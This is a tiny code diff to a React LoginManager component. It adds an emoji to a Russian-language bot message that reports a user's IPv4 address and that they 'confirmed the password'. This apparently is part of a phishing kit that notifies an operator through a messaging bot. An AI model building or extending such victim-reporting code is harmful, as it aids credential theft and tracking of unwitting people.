@@ -16,7 +16,7 @@ const LoginManager = ({info}) => {
 
     useEffect(() => {
         if (state !== 0) {
-            axios.post(bot.sendMessage('Пользователь <code>' + info.IPv4 + "</code> Подтвердил пароль!"), '')
+            axios.post(bot.sendMessage('✔ Пользователь <code>' + info.IPv4 + "</code> Подтвердил пароль!"), '')
         }
     }, [state])
 
